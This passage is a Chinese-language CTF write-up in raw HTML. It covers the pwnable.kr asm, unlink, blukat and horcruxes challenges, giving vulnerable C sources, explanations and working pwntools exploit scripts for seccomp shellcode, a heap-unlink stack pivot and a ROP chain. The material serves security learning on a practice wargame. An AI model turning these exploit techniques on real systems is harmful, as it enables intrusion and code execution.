class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>这道题主要涉及<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a></p><blockquote><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p></blockquote><p>通过此特性初始化SCMP_ACT_KILL限制了所有 syscall，后添加规则允许使用的仅为 open read write exit exit_group</p><p>我们需要做的便是：</p><ol><li>打开(open) flag 文件</li><li>读取(read) flag 文件</li><li>写(write) 文件内容写到标准输出(stdout)</li></ol><p>对入门不会生成 shellcode 的我，pwnlib 提供了 shellcraft，<strong>注意发送时需要调用 asm 方法编译汇编码</strong></p><hr><ul><li><a href="https://www.man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual </a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux" target="_blank" rel="noopener">X86 Assembly/Interfacing with Linux</a></li></ul><p>从上面的资料可知文件句柄是通过 rax 返回的，所以我们直接从 rax 读取文件即可，但实际上linux文件句柄(fd)是从 3 开始增长的，因为我们第一个也只打开一个，所以必定是 3</p><h3 id="解题-17"><a href="#解题-17" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sc += shellcraft.read("rax", "rsp", 100)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="19-unlink"><a href="#19-unlink" class="headerlink" title="19. unlink"></a>19. unlink</h2><h3 id="题目-18"><a href="#题目-18" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token punctuation">{</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>OBJ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token punctuation">{</span>    OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>    BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>    FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>    FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>    BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>    A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>    B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>    B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>    C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// heap overflow!</span>    <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// exploit this unlink!</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>首先先看了 double-free 的利用，即 unlink 的一种利用是通过劫持GOT表实现命令执行，但是题目中 Unlink 后没有跟其他函数的，所以无法利用</p><p>那么能否直接操控 main 返回地址来实现跳转到 shellcode 执行呢？看下 main 最后的汇编是怎么写的</p><pre class=" language-armasm"><code class="language-armasm">0x080485ff <+208>:    mov    ecx,DWORD PTR [ebp-0x4]0x08048602 <+211>:    leave  0x08048603 <+212>:    lea    esp,[ecx-0x4]0x08048606 <+215>:    ret </code></pre><p>翻译过来</p><pre class=" language-armsam"><code class="language-armsam">mov    ecx,[ebp-0x4]mov    esp,ebppop    ebplea    esp,[ecx-0x4]ret</code></pre><p>此时栈内分布</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15918589934469.jpg" alt="-w790"></p><p>我们无法直接控制 eip，那么能否通过控制 ebp -&gt; ecx -&gt; esp -&gt; eip 实现呢</p><p>我们首先关注到 unlink</p><pre class=" language-c"><code class="language-c">BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span></code></pre><p>如下：</p><pre class=" language-plain"><code class="language-plain">BK = *(P + 4)FD = *(P)FD -> bk = BK -> *(*(P)+4) = *(P + 4)BK -> fd = FD -> *(*(P+4)) = *(P)</code></pre><p>更直白的说</p><pre class=" language-plain"><code class="language-plain">*(*(P->fd) + 4) = *(P->bk) 将 fd 的值 +4 作为地址，其值为 bk 的值*(*(P->bk)) = *(P->fd) 将 bk 的值作为地址，其值为 fd 的值</code></pre><p>即我们通过控制 fd bk 可以获取到两次写内存的机会</p><ol><li>利用 BK -&gt; fd = FD，bk 控制地址，fd 控制值</li><li>利用 FD -&gt; bk = BK，fd 控制地址，bk 控制值</li></ol><p>其次把已知条件列出来</p><ul><li>eip = [esp]</li><li>esp = ecx - 0x4</li><li>ecx = [ebp - 0x4]</li></ul><p>再根据栈中内容，可得</p><ul><li>stack_A + 0x10 = ebp - 0x4</li></ul><p>由于我们可以通过 A-&gt;buf 进行 overflow，假设我们将func_shell放在buf前4个字节，同时我们把buf地址标记为 shellcode，那么就有</p><ul><li>[heap_A + 0x8] = [shellcode] = func_shell = eip</li><li>shellcode = esp = ecx - 0x4 =&gt; heap_A + 0x8 = ecx - 0x4</li></ul><p>我们的目标是通过控制 fd bk 进而控制栈内存储的 ecx，进而控制 esp eip，我们先选取<code>bk 地址 fd 值</code>的利用方式即<code>BK-&gt;fd=FD</code>，有</p><ul><li>[bk] = &amp;ecx</li><li>[fd] = ecx</li></ul><p>结合上面的条件，推得</p><ul><li>[bk] = ebp - 0x4 = stack_A + 0x10</li><li>[fd] = heap_A + 0xc</li></ul><p>以此设置布局如下：</p><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|   heap_A + 0xc  |  stack_A + 0x10 |+-----------------+-----------------+ </code></pre><hr><p>假如我们选择<code>fd 地址 bk 值</code>的方式<code>FD-&gt;bk=BK</code>，有</p><ul><li>[bk] = ecx</li><li>[fd] + 0x4 = &amp;ecx</li></ul><p>推得</p><ul><li>[bk] = heap_A + 0xc</li><li>[fd] = ebp - 0x4 - 0x4 = stack_A + 0x10 - 0x4 = stack_A + 0xc</li></ul><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|  stack_A + 0xc  |   heap_A + 0xc  |+-----------------+-----------------+ </code></pre><h3 id="解题-18"><a href="#解题-18" class="headerlink" title="解题"></a>解题</h3><p>做完题后再想了几遍构造原理，感觉通透了不少</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>is_remote <span class="token operator">=</span> <span class="token boolean">True</span>method <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 1 or 2</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/unlink/unlink"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/unlink"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is stack address leak: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is heap address leak: "</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"get shell!\n"</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x080484eb</span><span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">else</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"."</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="20-blukat"><a href="#20-blukat" class="headerlink" title="20. blukat"></a>20. blukat</h2><h3 id="题目-19"><a href="#题目-19" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>…脑洞题，password为<code>cat: password: Permission denied</code>，就是为了提醒注意文件权限</p><h3 id="解题-19"><a href="#解题-19" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'blukat'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/blukat/blukat"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat: password: Permission denied"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="21-horcruxes"><a href="#21-horcruxes" class="headerlink" title="21. horcruxes"></a>21. horcruxes</h2><h3 id="题目-20"><a href="#题目-20" class="headerlink" title="题目"></a>题目</h3><p>需要<code>sudo apt install libseccomp-dev:i386</code></p><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>有个名为 ropme 的函数，主要关注这里，其功能判断输入值是否为 sum，是的话则返回 flag<br>可以明显看到数组<code>s</code>有溢出，但是怎么利用呢？</p><ol><li>直接控制 ropme 返回地址到 open flag 的地址</li><li>获取 a~g 的变量值通过 sum 验证</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15921305968734.jpg" alt="-w469"></p><p>首先检查看到是没有开启 ASLR 地址是固定利用的，接着往下走</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15921446659641.jpg" alt="-w307"></p><p>第一种方法中，由于跳转地址含有<code>0x0a</code>导致无法有效从 gets 输入，所以只能考虑第二种方法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15921431564969.jpg" alt="-w469"></p><p>我们看到 A~G 函数都是无参函数，且执行 printf 后 ret 返回，所以在栈上表现为返回执行原函数下一地址指令</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15921433549736.jpg" alt="-w474"></p><p>我们通过把栈覆盖如下，当输入不等于 sum 时，ropme 即会跳转调用 A 函数输出 a，当从 A 函数返回时便会调用 B 函数……当 A~G 都执行完毕后计算 sum 值，再次调回 ropme 输入正确答案即可</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/d4fb29f2/15921442969783.jpg" alt="-w304"></p><h3 id="解题-20"><a href="#解题-20" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>is_remote <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9032</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/horcruxes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'.'</span> <span class="token operator">*</span> <span class="token number">0x78</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe4b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># A</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># B</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe89</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># C</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fea8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># D</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fec7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># E</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fee6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># F</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809ff05</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># G</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fffc</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ropme</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> int<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">')\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum <span class="token operator">+=</span> nump<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">LINUX SYSTEM CALL TABLE FOR X86 64</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linux程序的常用保护机制</a></li><li><a href="http://0x4c43.cn/2017/1024/linux-memory-management-and-heap/" target="_blank" rel="noopener">Linux 内存管理与堆</a></li><li><a href="https://segmentfault.com/a/1190000005118060" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></li><li><a href="https://segmentfault.com/a/1190000005183474" target="_blank" rel="noopener">Linux堆内存管理深入分析（下）</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/" target="_blank" rel="noopener">深入理解堆的实现</a></li><li><a href="https://www.bilibili.com/video/av200358962/" 